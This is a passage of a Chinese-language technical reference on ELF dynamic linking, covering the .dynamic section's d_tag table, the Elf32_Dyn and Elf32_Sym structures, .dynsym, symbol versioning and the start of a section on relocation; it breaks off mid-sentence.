\u8bf4\uff0c\u5bf9\u4e8e\u4e0d\u540c\u7684\u8fdb\u7a0b\u6765\u8bf4\uff0c\u5b83\u7684\u5730\u5740\u4f1a\u6709\u6240\u4e0d\u540c\u3002\u7cfb\u7edf\u901a\u8fc7 mmap (KE_OS) \u4ee5\u53ca\u4e00\u4e9b\u76f8\u5173\u7684\u64cd\u4f5c\u6765\u521b\u5efa\u52a8\u6001\u6bb5\u4e2d\u7684\u5185\u5bb9\u3002\u56e0\u6b64\uff0c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u5730\u5740\u901a\u5e38\u6765\u8bf4\u4e0d\u4f1a\u548c\u539f\u6765\u7684\u53ef\u6267\u884c\u6587\u4ef6\u7684\u539f\u6709\u5730\u5740\u51b2\u7a81\u3002\n\n\n\u53ef\u6267\u884c\u6587\u4ef6\u4e00\u822c\u4f1a\u88ab\u52a0\u8f7d\u5230\u56fa\u5b9a\u7684\u5730\u5740\u3002\u7cfb\u7edf\u901a\u8fc7\u7a0b\u5e8f\u5934\u90e8\u8868\u7684\u865a\u62df\u5730\u5740\u6765\u521b\u5efa\u5bf9\u5e94\u7684\u6bb5\u3002\u56e0\u6b64\uff0c\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u7684\u89e3\u91ca\u5668\u7684\u865a\u62df\u5730\u5740\u53ef\u80fd\u548c\u7b2c\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u51b2\u7a81\u3002\u89e3\u91ca\u5668\u6709\u8d23\u4efb\u6765\u89e3\u51b3\u76f8\u5e94\u7684\u51b2\u7a81\u3002\n\n\n\n\n.dynamic\n\n\n\u5982\u679c\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u53c2\u4e0e\u5230\u52a8\u6001\u94fe\u63a5\u7684\u8fc7\u7a0b\u4e2d\uff0c\u90a3\u4e48\u5b83\u7684\u7a0b\u5e8f\u5934\u90e8\u8868\u5c06\u4f1a\u5305\u542b\u4e00\u4e2a\u7c7b\u578b\u4e3a PT_DYNAMIC \u7684\u5143\u7d20\u3002\u8fd9\u4e2a\u6bb5\u5305\u542b\u4e86 .dynamic \u8282\uff0c\u5176\u5b9e\u8fd9\u4e2a\u6bb5\u5c31\u662f\u4e00\u4e2a\u5355\u7eaf\u7684\u952e\u503c\u5bf9\u3002\n\n\n\u52a8\u6001\u8282\u4e00\u822c\u4fdd\u5b58\u4e86 ELF \u6587\u4ef6\u7684\u5982\u4e0b\u4fe1\u606f\n\n\n\n\n\u4f9d\u8d56\u4e8e\u54ea\u4e9b\u52a8\u6001\u5e93\n\n\n\u52a8\u6001\u7b26\u53f7\u8282\u4fe1\u606f\n\n\n\u52a8\u6001\u5b57\u7b26\u4e32\u8282\u4fe1\u606f\n\n\n\n\n\u6211\u4eec\u4e00\u822c\u4f7f\u7528 _DYNAMIC \u7b26\u53f7\u6765\u6807\u8bb0\u8fd9\u4e2a\u8282\uff0c\u5b83\u7684\u7ed3\u6784\u5982\u4e0b\n\n\ntypedef struct {\n    Elf32_Sword     d_tag;\n    union {\n        Elf32_Word  d_val;\n        Elf32_Addr  d_ptr;\n    } d_un;\n} Elf32_Dyn;\nextern Elf32_Dyn_DYNAMIC[];\n\n\n\n\n\u5176\u4e2d\uff0cd_tag \u7684\u53d6\u503c\u51b3\u5b9a\u4e86\u8be5\u5982\u4f55\u89e3\u91ca d_un\u3002\n\n\n\n\nd_val\n\n\n\u8fd9\u4e2a\u5b57\u6bb5\u8868\u793a\u4e00\u4e2a\u6574\u6570\u503c\uff0c\u53ef\u4ee5\u6709\u591a\u79cd\u610f\u601d\u3002\n\n\n\n\n\n\nd_ptr\n\n\n\u8fd9\u4e2a\u5b57\u6bb5\u8868\u793a\u7a0b\u5e8f\u7684\u865a\u62df\u5730\u5740\u3002\u6b63\u5982\u4e4b\u524d\u6240\u8bf4\u7684\uff0c\u4e00\u4e2a\u6587\u4ef6\u7684\u865a\u62df\u5730\u5740\u5728\u6267\u884c\u7684\u8fc7\u7a0b\u4e2d\u53ef\u80fd\u548c\u5185\u5b58\u7684\u865a\u62df\u5730\u5740\u4e0d\u5339\u914d\u3002\u5f53\u89e3\u6790\u52a8\u6001\u7ed3\u6784\u4e2d\u7684\u5730\u5740\u65f6\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u6839\u636e\u539f\u59cb\u6587\u4ef6\u7684\u503c\u4ee5\u53ca\u5185\u5b58\u7684\u57fa\u5730\u5740\u6765\u8ba1\u7b97\u771f\u6b63\u7684\u5730\u5740\u3002\u4e3a\u4e86\u4fdd\u6301\u4e00\u81f4\u6027\uff0c\u6587\u4ef6\u4e2d\u5e76\u4e0d\u4f1a\u5305\u542b\u91cd\u5b9a\u4f4d\u5165\u53e3\u6765\"\u7ea0\u6b63\"\u52a8\u6001\u7ed3\u6784\u4e2d\u7684\u5730\u5740\u3002\n\n\n\n\n\n\n\n\n\u4e0b\u8868\u603b\u7ed3\u4e86\u53ef\u6267\u884c\u6587\u4ef6\u4ee5\u53ca\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\u7684 d_tag \u7684\u9700\u6c42\n\u3002\u5982\u679c\u4e00\u4e2a tag \u88ab\u6807\u8bb0\u4e3a\"mandatory\"\uff0c\u90a3\u4e48\u5bf9\u4e8e\u4e00\u4e2a TIS ELF conforming \u7684\u6587\u4ef6\u6765\u8bf4\uff0c\u5176\u52a8\u6001\u94fe\u63a5\u6570\u7ec4\u5fc5\u987b\u5305\u542b\u5bf9\u5e94\u5165\u53e3\u7684\u7c7b\u578b\u3002\u540c\u6837\u7684\uff0c\u201coptional\u201d\u610f\u5473\u7740\u53ef\u4ee5\u6709\uff0c\u4e5f\u53ef\u4ee5\u6709\u6ca1\u6709\u3002\n\n\n\n\n\n\n\n\n\u540d\u79f0\n\n\n\u6570\u503c\n\n\nd_un\n\n\n\u53ef\u6267\u884c\n\n\n\u5171\u4eab \u76ee\u6807\n\n\n\u8bf4\u660e\n\n\n\n\n\n\n\n\n\n\nDT_NULL\n\n\n0\n\n\n\u5ffd\u7565\n\n\n\u5fc5\u9700\n\n\n\u5fc5\u9700\n\n\n\u6807\u5fd7\u7740 _DYNAMIC \u6570\u7ec4\u7684\u672b\u7aef\u3002\n\n\n\n\n\n\nDT_NEEDED\n\n\n1\n\n\nd_val\n\n\n\u53ef\u9009\n\n\n\u53ef\u9009\n\n\n\u5305\u542b\u4ee5NULL \u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\u7684\u5b57\u7b26\u4e32\u8868\u504f\u79fb\uff0c\u8be5\u5b57\u7b26\u4e32\u7ed9\u51fa\u67d0\u4e2a\u9700\u8981\u7684\u5e93\u7684\u540d\u79f0\u3002\u6240\u4f7f\u7528\u7684\u7d22\u5f15\u4e3aDT_STRTAB\u7684\u4e0b\u6807\u3002\u52a8\u6001\u6570\u7ec4\u4e2d\u53ef\u4ee5\u5305\u542b\u5f88\u591a\u4e2a\u8fd9\u79cd\u7c7b\u578b\u7684\u6807\u8bb0\u3002\u8fd9\u4e9b\u9879\u5728\u8fd9\u79cd\u7c7b\u578b\u6807\u8bb0\u4e2d\u7684\u76f8\u5bf9\u987a\u5e8f\u6bd4\u8f83\u91cd\u8981\u3002\u4f46\u662f\u4e0e\u5176\u5b83\u7684\u6807\u8bb0\u4e4b\u524d\u7684\u987a\u5e8f\u5012\u65e0\u6240\u8c13\u3002\u5bf9\u5e94\u7684\u6bb5\u4e3a.gnu.version_r\u3002\n\n\n\n\n\n\nDT_PLTRELSZ\n\n\n2\n\n\nd_val\n\n\n\u53ef\u9009\n\n\n\u53ef\u9009\n\n\n\u7ed9\u51fa\u4e0e\u8fc7\u7a0b\u94fe\u63a5\u8868\u76f8\u5173\u7684\u91cd\u5b9a\u4f4d\u9879\u7684\u603b\u7684\u5927\u5c0f\u3002\u5982\u679c\u5b58\u5728DT_JMPREL\u7c7b\u578b\u7684\u9879\uff0c\u90a3\u4e48DT_PLTRELSZ\u4e5f\u5fc5\u987b\u5b58\u5728\u3002\n\n\n\n\n\n\nDT_PLTGOT\n\n\n3\n\n\nd_ptr\n\n\n\u53ef\u9009\n\n\n\u53ef\u9009\n\n\n\u7ed9\u51fa\u4e0e\u8fc7\u7a0b\u94fe\u63a5\u8868\u6216\u8005\u5168\u5c40\u504f\u79fb\u8868\u76f8\u5173\u8054\u7684\u5730\u5740\uff0c\u5bf9\u5e94\u7684\u6bb5.got.plt\n\n\n\n\n\n\nDT_HASH\n\n\n4\n\n\nd_ptr\n\n\n\u5fc5\u9700\n\n\n\u5fc5\u9700\n\n\n\u6b64\u7c7b\u578b\u8868\u9879\u5305\u542b\u7b26\u53f7\u54c8\u5e0c\u8868\u7684\u5730\u5740\u3002\u6b64\u54c8\u5e0c\u8868\u6307\u7684\u662f\u88ab DT_SYMTAB \u5f15\u7528\u7684\u7b26\u53f7\u8868\u3002\n\n\n\n\n\n\nDT_STRTAB\n\n\n5\n\n\nd_ptr\n\n\n\u5fc5\u9700\n\n\n\u5fc5\u9700\n\n\n\u6b64\u7c7b\u578b\u8868\u9879\u5305\u542b\u52a8\u6001\u5b57\u7b26\u4e32\u8868\u7684\u5730\u5740\u3002\u7b26\u53f7\u540d\u3001\u5e93\u540d\u3001\u548c\u5176\u5b83\u5b57\u7b26\u4e32\u90fd\u5305\u542b\u5728\u6b64\u8868\u4e2d\u3002\u5bf9\u5e94\u7684\u8282\u7684\u540d\u5b57\u5e94\u8be5\u662f.dynstr\u3002\n\n\n\n\n\n\nDT_SYMTAB\n\n\n6\n\n\nd_ptr\n\n\n\u5fc5\u9700\n\n\n\u5fc5\u9700\n\n\n\u6b64\u7c7b\u578b\u8868\u9879\u5305\u542b\u52a8\u6001\u7b26\u53f7\u8868\u7684\u5730\u5740\u3002\u5bf9 32 \u4f4d\u7684\u6587\u4ef6\u800c\u8a00\uff0c\u8fd9\u4e2a\u7b26\u53f7\u8868\u4e2d\u7684\u6761\u76ee\u7684\u7c7b\u578b\u4e3a Elf32_Sym\u3002\n\n\n\n\n\n\nDT_RELA\n\n\n7\n\n\nd_ptr\n\n\n\u5fc5\u9700\n\n\n\u53ef\u9009\n\n\n\u6b64\u7c7b\u578b\u8868\u9879\u5305\u542b\u91cd\u5b9a\u4f4d\u8868\u7684\u5730\u5740\u3002\u6b64\u8868\u4e2d\u7684\u5143\u7d20\u5305\u542b\u663e\u5f0f\u7684\u8865\u9f50\uff0c\u4f8b\u5982 32 \u4f4d\u6587\u4ef6\u4e2d\u7684 Elf32_Rela\u3002\u76ee\u6807\u6587\u4ef6\u53ef\u80fd\u6709\u591a\u4e2a\u91cd\u5b9a\u4f4d\u8282\u533a\u3002\u5728\u4e3a\u53ef\u6267\u884c\u6587\u4ef6\u6216\u8005\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u521b\u5efa\u91cd\u5b9a\u4f4d\u8868\u65f6\uff0c\u94fe\u63a5\u7f16\u8f91\u5668\u5c06\u8fd9\u4e9b\u8282\u533a\u8fde\u63a5\u8d77\u6765\uff0c\u5f62\u6210\u4e00\u4e2a\u8868\u3002\u5c3d\u7ba1\u5728\u76ee\u6807\u6587\u4ef6\u4e2d\u8fd9\u4e9b\u8282\u533a\u76f8\u4e92\u72ec\u7acb\uff0c\u4f46\u662f\u52a8\u6001\u94fe\u63a5\u5668\u628a\u5b83\u4eec\u89c6\u4e3a\u4e00\u4e2a\u8868\u3002\u5728\u52a8\u6001\u94fe\u63a5\u5668\u4e3a\u53ef\u6267\u884c\u6587\u4ef6\u521b\u5efa\u8fdb\u7a0b\u6620\u50cf\u6216\u8005\u5411\u4e00\u4e2a\u8fdb\u7a0b\u6620\u50cf\u4e2d\u6dfb\u52a0\u67d0\u4e2a\u5171\u4eab\u76ee\u6807\u65f6\uff0c\u8981\u8bfb\u53d6\u91cd\u5b9a\u4f4d\u8868\u5e76\u6267\u884c\u76f8\u5173\u7684\u52a8\u4f5c\u3002\u5982\u679c\u6b64\u5143\u7d20\u5b58\u5728\uff0c\u52a8\u6001\u7ed3\u6784\u4f53\u4e2d\u4e5f\u5fc5\u987b\u5305\u542b DT_RELASZ \u548c DT_RELAENT \u5143\u7d20\u3002\u5982\u679c\u5bf9\u4e8e\u67d0\u4e2a\u6587\u4ef6\u6765\u8bf4\uff0c\u91cd\u5b9a\u4f4d\u662f\u5fc5\u9700\u7684\u8bdd\uff0c\u90a3\u4e48 DT_RELA \u6216\u8005 DT_REL \u90fd\u53ef\u80fd\u5b58\u5728\u3002\n\n\n\n\n\n\nDT_RELASZ\n\n\n8\n\n\nd_val\n\n\n\u5fc5\u9700\n\n\n\u53ef\u9009\n\n\n\u6b64\u7c7b\u578b\u8868\u9879\u5305\u542b DT_RELA \u91cd\u5b9a\u4f4d\u8868\u7684\u603b\u5b57\u8282\u5927\u5c0f\u3002\n\n\n\n\n\n\nDT_RELAENT\n\n\n9\n\n\nd_val\n\n\n\u5fc5\u9700\n\n\n\u53ef\u9009\n\n\n\u6b64\u7c7b\u578b\u8868\u9879\u5305\u542b DT_RELA \u91cd\u5b9a\u4f4d\u9879\u7684\u5b57\u8282\u5927\u5c0f\u3002\n\n\n\n\n\n\nDT_STRSZ\n\n\n10\n\n\nd_val\n\n\n\u5fc5\u9700\n\n\n\u5fc5\u9700\n\n\n\u6b64\u7c7b\u578b\u8868\u9879\u7ed9\u51fa\u5b57\u7b26\u4e32\u8868\u7684\u5b57\u8282\u5927\u5c0f\uff0c\u6309\u5b57\u8282\u6570\u8ba1\u7b97\u3002\n\n\n\n\n\n\nDT_SYMENT\n\n\n11\n\n\nd_val\n\n\n\u5fc5\u9700\n\n\n\u5fc5\u9700\n\n\n\u6b64\u7c7b\u578b\u8868\u9879\u7ed9\u51fa\u7b26\u53f7\u8868\u9879\u7684\u5b57\u8282\u5927\u5c0f\u3002\n\n\n\n\n\n\nDT_INIT\n\n\n12\n\n\nd_ptr\n\n\n\u53ef\u9009\n\n\n\u53ef\u9009\n\n\n\u6b64\u7c7b\u578b\u8868\u9879\u7ed9\u51fa\u521d\u59cb\u5316\u51fd\u6570\u7684\u5730\u5740\u3002\n\n\n\n\n\n\nDT_FINI\n\n\n13\n\n\nd_ptr\n\n\n\u53ef\u9009\n\n\n\u53ef\u9009\n\n\n\u6b64\u7c7b\u578b\u8868\u9879\u7ed9\u51fa\u7ed3\u675f\u51fd\u6570\uff08Termination Function\uff09\u7684\u5730\u5740\u3002\n\n\n\n\n\n\nDT_SONAME\n\n\n14\n\n\nd_val\n\n\n\u5ffd\u7565\n\n\n\u53ef\u9009\n\n\n\u6b64\u7c7b\u578b\u8868\u9879\u7ed9\u51fa\u4e00\u4e2a\u4ee5 NULL \u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\u7684\u5b57\u7b26\u4e32\u8868\u504f\u79fb\uff0c\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u662f\u67d0\u4e2a\u5171\u4eab\u76ee\u6807\u7684\u540d\u79f0\u3002\u8be5\u504f\u79fb\u5b9e\u9645\u4e0a\u662f DT_STRTAB \u4e2d\u7684\u7d22\u5f15\u3002\n\n\n\n\n\n\nDT_RPATH\n\n\n15\n\n\nd_val\n\n\n\u53ef\u9009\n\n\n\u5ffd\u7565\n\n\n\u6b64\u7c7b\u578b\u8868\u9879\u5305\u542b\u4ee5 NULL \u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\u7684\u5b57\u7b26\u4e32\u8868\u504f\u79fb\uff0c\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u662f\u641c\u7d22\u5e93\u65f6\u4f7f\u7528\u7684\u641c\u7d22\u8def\u5f84\u3002\u8be5\u504f\u79fb\u5b9e\u9645\u4e0a\u662f DT_STRTAB \u4e2d\u7684\u7d22\u5f15\u3002\n\n\n\n\n\n\nDT_SYMBOLIC\n\n\n16\n\n\n\u5ffd\u7565\n\n\n\u5ffd\u7565\n\n\n\u53ef\u9009\n\n\n\u5982\u679c\u8fd9\u79cd\u7c7b\u578b\u8868\u9879\u51fa\u73b0\u5728\u5171\u4eab\u76ee\u6807\u5e93\u4e2d\uff0c\u90a3\u4e48\u8fd9\u5c06\u4f1a\u6539\u53d8\u52a8\u6001\u94fe\u63a5\u5668\u7684\u7b26\u53f7\u89e3\u6790\u7b97\u6cd5\u3002\u52a8\u6001\u8fde\u63a5\u5668\u5c06\u9996\u5148\u9009\u62e9\u4ece\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u672c\u8eab\u5f00\u59cb\u641c\u7d22\u7b26\u53f7\uff0c\u53ea\u6709\u5728\u641c\u7d22\u5931\u8d25\u65f6\uff0c\u624d\u4f1a\u9009\u62e9\u4ece\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u641c\u7d22\u76f8\u5e94\u7684\u7b26\u53f7\u3002\n\n\n\n\n\n\nDT_REL\n\n\n17\n\n\nd_ptr\n\n\n\u5fc5\u9700\n\n\n\u53ef\u9009\n\n\n\u6b64\u7c7b\u578b\u8868\u9879\u4e0e DT_RELA\u7c7b\u578b\u7684\u8868\u9879\u7c7b\u4f3c\uff0c\u53ea\u662f\u5176\u8868\u683c\u4e2d\u5305\u542b\u9690\u5f0f\u7684\u8865\u9f50\uff0c\u5bf9 32 \u4f4d\u6587\u4ef6\u800c\u8a00\uff0c\u5c31\u662f Elf32_Rel\u3002\u5982\u679cELF\u6587\u4ef6\u4e2d\u5305\u542b\u6b64\u5143\u7d20\uff0c\u90a3\u4e48\u52a8\u6001\u7ed3\u6784\u4e2d\u4e5f\u5fc5\u987b\u5305\u542b DT_RELSZ \u548c DT_RELENT \u7c7b\u578b\u7684\u5143\u7d20\u3002\n\n\n\n\n\n\nDT_RELSZ\n\n\n18\n\n\nd_val\n\n\n\u5fc5\u9700\n\n\n\u53ef\u9009\n\n\n\u6b64\u7c7b\u578b\u8868\u9879\u5305\u542b DT_REL \u91cd\u5b9a\u4f4d\u8868\u7684\u603b\u5b57\u8282\u5927\u5c0f\u3002\n\n\n\n\n\n\nDT_RELENT\n\n\n19\n\n\nd_val\n\n\n\u5fc5\u9700\n\n\n\u53ef\u9009\n\n\n\u6b64\u7c7b\u578b\u8868\u9879\u5305\u542b DT_REL \u91cd\u5b9a\u4f4d\u9879\u7684\u5b57\u8282\u5927\u5c0f\u3002\n\n\n\n\n\n\nDT_PLTREL\n\n\n20\n\n\nd_val\n\n\n\u53ef\u9009\n\n\n\u53ef\u9009\n\n\n\u6b64\u7c7b\u578b\u8868\u9879\u7ed9\u51fa\u8fc7\u7a0b\u94fe\u63a5\u8868\u6240\u5f15\u7528\u7684\u91cd\u5b9a\u4f4d\u9879\u7684\u5730\u5740\u3002\u6839\u636e\u5177\u4f53\u60c5\u51b5\uff0c d_val \u5bf9\u5e94\u7684\u5730\u5740\u53ef\u80fd\u5305\u542b DT_REL \u6216\u8005  DT_RELA\u3002\u8fc7\u7a0b\u94fe\u63a5\u8868\u4e2d\u7684\u6240\u6709\u91cd\u5b9a\u4f4d\u90fd\u5fc5\u987b\u91c7\u7528\u76f8\u540c\u7684\u91cd\u5b9a\u4f4d\u65b9\u5f0f\u3002\n\n\n\n\n\n\nDT_DEBUG\n\n\n21\n\n\nd_ptr\n\n\n\u53ef\u9009\n\n\n\u5ffd\u7565\n\n\n\u6b64\u7c7b\u578b\u8868\u9879\u7528\u4e8e\u8c03\u8bd5\u3002ABI \u672a\u89c4\u5b9a\u5176\u5185\u5bb9\uff0c\u8bbf\u95ee\u8fd9\u4e9b\u6761\u76ee\u7684\u7a0b\u5e8f\u53ef\u80fd\u4e0e ABI \u4e0d\u517c\u5bb9\u3002\n\n\n\n\n\n\nDT_TEXTREL\n\n\n22\n\n\n\u5ffd\u7565\n\n\n\u53ef\u9009\n\n\n\u53ef\u9009\n\n\n\u5982\u679c\u6587\u4ef6\u4e2d\u4e0d\u5305\u542b\u6b64\u7c7b\u578b\u7684\u8868\u9879\uff0c\u5219\u8868\u793a\u6ca1\u6709\u4efb\u4f55\u91cd\u5b9a\u4f4d\u8868\u9879\u80fd\u591f\u9020\u6210\u5bf9\u4e0d\u53ef\u5199\u6bb5\u7684\u4fee\u6539\u3002\u5982\u679c\u5b58\u5728\u7684\u8bdd\uff0c\u5219\u53ef\u80fd\u5b58\u5728\u82e5\u5e72\u91cd\u5b9a\u4f4d\u9879\u8bf7\u6c42\u5bf9\u4e0d\u53ef\u5199\u6bb5\u8fdb\u884c\u4fee\u6539\uff0c\u56e0\u6b64\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u53ef\u4ee5\u505a\u76f8\u5e94\u7684\u51c6\u5907\u3002\n\n\n\n\n\n\nDT_JMPREL\n\n\n23\n\n\nd_ptr\n\n\n\u53ef\u9009\n\n\n\u53ef\u9009\n\n\n\u8be5\u7c7b\u578b\u7684\u6761\u76ee\u7684 d_ptr \u6210\u5458\u5305\u542b\u4e86\u8fc7\u7a0b\u94fe\u63a5\u8868\u7684\u5730\u5740\uff0c\u5e76\u4e14\u7d22\u5f15\u65f6\u5e94\u8be5\u4f1a\u628a\u8be5\u5730\u5740\u5f3a\u5236\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\u7c7b\u578b\u7684\u6307\u9488\u3002\u628a\u91cd\u5b9a\u4f4d\u8868\u9879\u5206\u5f00\u6709\u5229\u4e8e\u8ba9\u52a8\u6001\u94fe\u63a5\u5668\u5728\u8fdb\u7a0b\u521d\u59cb\u5316\u65f6\u5ffd\u7565\u5b83\u4eec\uff08\u5f00\u542f\u4e86\u5ef6\u8fdf\u7ed1\u5b9a\uff09\u3002\u5982\u679c\u5b58\u5728\u6b64\u6210\u5458\uff0c\u76f8\u5173\u7684 DT_PLTRELSZ \u548c  DT_PLTREL \u5fc5\u987b\u4e5f\u5b58\u5728\u3002\n\n\n\n\n\n\nDT_BIND_NOW\n\n\n24\n\n\n\u5ffd\u7565\n\n\n\u53ef\u9009\n\n\n\u53ef\u9009\n\n\n\u5982\u679c\u53ef\u6267\u884c\u6587\u4ef6\u6216\u8005\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\u5b58\u5728\u6b64\u7c7b\u578b\u7684\u8868\u9879\u7684\u8bdd\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5728\u5c06\u63a7\u5236\u6743\u8f6c\u4ea4\u7ed9\u7a0b\u5e8f\u524d\uff0c\u5e94\u8be5\u5c06\u8be5\u6587\u4ef6\u7684\u6240\u6709\u9700\u8981\u91cd\u5b9a\u4f4d\u7684\u5730\u5740\u90fd\u8fdb\u884c\u91cd\u5b9a\u4f4d\u3002\u8fd9\u4e2a\u8868\u9879\u7684\u4f18\u5148\u6743\u9ad8\u4e8e\u5ef6\u8fdf\u7ed1\u5b9a\uff0c\u53ef\u4ee5\u901a\u8fc7\u73af\u5883\u53d8\u91cf\u6216\u8005dlopen(BA_LIB)\u6765\u8bbe\u7f6e\u3002\n\n\n\n\n\n\nDT_LOPROC  ~DT_HIPROC\n\n\n0x70000000 ~0x7fffffff\n\n\n\u672a\u6307\u5b9a\n\n\n\u672a\u6307\u5b9a\n\n\n\u672a\u6307\u5b9a\n\n\n\u8fd9\u4e2a\u8303\u56f4\u7684\u8868\u9879\u662f\u4fdd\u7559\u7ed9\u5904\u7406\u5668\u7279\u5b9a\u7684\u8bed\u4e49\u7684\u3002\n\n\n\n\n\n\n\n\n\u6ca1\u6709\u51fa\u73b0\u5728\u6b64\u8868\u4e2d\u7684\u6807\u8bb0\u503c\u662f\u4fdd\u7559\u7684\u3002\u6b64\u5916\uff0c\u9664\u4e86\u6570\u7ec4\u672b\u5c3e\u7684 DT_NULL \u5143\u7d20\u4ee5\u53ca DT_NEEDED \u5143\u7d20\u7684\u76f8\u5bf9\u987a\u5e8f\u7ea6\u675f\u4ee5\u5916\uff0c \u5176\u4ed6\u8868\u9879\u53ef\u4ee5\u4ee5\u4efb\u610f\u987a\u5e8f\u51fa\u73b0\u3002\n\n\n.dynstr\n\n\n.dynsym\n\n\n\u6982\u8ff0\n\n\n\u52a8\u6001\u94fe\u63a5\u7684 ELF \u6587\u4ef6\u5177\u6709\u4e13\u95e8\u7684\u52a8\u6001\u7b26\u53f7\u8868\uff0c\u5176\u4f7f\u7528\u7684\u7ed3\u6784\u5c31\u662f Elf32_Sym\uff0c\u4f46\u662f\u5176\u5b58\u50a8\u7684\u8282\u4e3a .dynsym\u3002\u8fd9\u91cc\u518d\u6b21\u7ed9\u51fa Elf32_Sym \u7684\u7ed3\u6784\n\n\ntypedef struct\n{\n  Elf32_Word    st_name;   /* Symbol name (string tbl index) */\n  Elf32_Addr    st_value;  /* Symbol value */\n  Elf32_Word    st_size;   /* Symbol size */\n  unsigned char st_info;   /* Symbol type and binding */\n  unsigned char st_other;  /* Symbol visibility under glibc\n=2.2 */\n  Elf32_Section st_shndx;  /* Section index */\n} Elf32_Sym;\n\n\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f \n.dynsym\n \u662f\u8fd0\u884c\u65f6\u6240\u9700\u7684\uff0cELF \u6587\u4ef6\u4e2d export/import \u7684\u7b26\u53f7\u4fe1\u606f\u5168\u5728\u8fd9\u91cc\u3002\u4f46\u662f\uff0c\n.symtab\n \u8282\u4e2d\u5b58\u50a8\u7684\u4fe1\u606f\u662f\u7f16\u8bd1\u65f6\u7684\u7b26\u53f7\u4fe1\u606f\uff0c\u5b83\u4eec\u5728 \nstrip\n \u4e4b\u540e\u4f1a\u88ab\u5220\u9664\u6389\u3002\n\n\n\u6211\u4eec\u4e3b\u8981\u5173\u6ce8\u52a8\u6001\u7b26\u53f7\u4e2d\u7684\u4e24\u4e2a\u6210\u5458\n\n\n\n\nst_name\uff0c \u8be5\u6210\u5458\u4fdd\u5b58\u7740\u52a8\u6001\u7b26\u53f7\u5728 .dynstr \u8868\uff08\u52a8\u6001\u5b57\u7b26\u4e32\u8868\uff09\u4e2d\u7684\u504f\u79fb\u3002\n\n\nst_value\uff0c\u5982\u679c\u8fd9\u4e2a\u7b26\u53f7\u88ab\u5bfc\u51fa\uff0c\u8fd9\u4e2a\u7b26\u53f7\u4fdd\u5b58\u7740\u5bf9\u5e94\u7684\u865a\u62df\u5730\u5740\u3002\n\n\n\n\n\u7b26\u53f7\u7248\u672c\n\n\n\u52a8\u6001\u7b26\u53f7\u4e0e\u6307\u5411\u5b83\u7684 Elf_Verdef \u4fdd\u5b58\u5728 .gnu.version \u6bb5\u4e2d\uff0c\u5176\u4e2d\uff0c\u7531 Elf_Verneed \u7ed3\u6784\u4f53\u6784\u6210\u7684\u6570\u7ec4\u7684\u6bcf\u4e2a\u5143\u7d20\u5bf9\u5e94\u52a8\u6001\u7b26\u53f7\u8868\u7684\u4e00\u9879\u3002\u5176\u5b9e\uff0c\u8fd9\u4e2a\u7ed3\u6784\u4f53\u5c31\u53ea\u6709\u4e00\u4e2a\u57df\uff1a\u90a3\u5c31\u662f\u4e00\u4e2a16\u4f4d\u7684\u6574\u6570\uff0c\u8868\u793a gnu.verion_r \u6bb5\u4e2d\u7684\u4e0b\u6807\u3002\n\n\n\u5728\u8fd9\u6837\u7684\u60c5\u51b5\u4e0b\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u4f7f\u7528 Elf_Rel \u7ed3\u6784\u4f53\u6210\u5458 r_info \u4e2d\u7684\u4e0b\u6807\u540c\u65f6\u4f5c\u4e3a .dynsym \u6bb5\u548c gnu.version \u6bb5\u7684\u4e0b\u6807\u3002\u8fd9\u6837\u5c31\u53ef\u4ee5\u4e00\u4e00\u5bf9\u5e94\u5230\u6bcf\u4e00\u4e2a\u7b26\u53f7\u5230\u5e95\u662f\u90a3\u4e2a\u7248\u672c\u7684\u4e86\u3002\n\n\nRelocation Related Sections\n\n\n\u94fe\u63a5\u5668\u5728\u5904\u7406\u76ee\u6807\u6587\u4ef6\u65f6\uff0c\u9700\u8981\u5bf9\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u67d0\u4e9b\u4f4d\u7f6e\u8fdb\u884c\u91cd\u5b9a\u4f4d\uff0c\u5373\u5c06\u7b26\u53f7\u6307\u5411\u6070\u5f53\u7684\u4f4d\u7f6e\uff0c\u786e\u4fdd\u7a0b\u5e8f\u6b63\u5e38\u6267\u884c\u3002\u4f8b\u5982\uff0c\u5f53\u7a0b\u5e8f\u8c03\u7528\u4e86\u4e00\u4e2a\u51fd\u6570\u65f6\uff0c\u76f8\u5173\u7684\u8c03\u7528\u6307\u4ee4\u5fc5\u987b\u628a\u63a7\u5236\u6d41\u4ea4\u7ed9\u9002\u5f53\u7684\u76ee\u6807\u6267\u884c\u5730\u5740\u3002\n\n\n\u5728 ELF \u6587\u4ef6\u4e2d\uff0c\u5bf9\u4e8e\u6bcf\u4e00\u4e2a\u9700\u8981\u91cd\u5b9a\u4f4d\u7684 ELF \u8282\u90fd\u6709\u5bf9\u5e94\u7684\u91cd\u5b9a\u4f4d\u8868\uff0c\u6bd4\u5982\u8bf4 .text \u8282\u5982\u679c\u9700\u8981\u91cd\u5b9a\u4f4d\uff0c\u90a3\u4e48\u5176\u5bf9\u5e94\u7684\u91cd\u5b9a\u4f4d\u8868\u4e3a .rel.text\u3002\n\n\n\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u5f53\u4e00\u4e2a\u7a0b\u5e8f\u5bfc\u5165\u67d0\u4e2a\u51fd\u6570\u65f6\uff0c.dynstr \u5c31\u4f1a\u5305\u542b\u5bf9\u5e94\u51fd\u6570\u540d\u79f0\u7684\u5b57\u7b26\u4e32\uff0c.dynsym 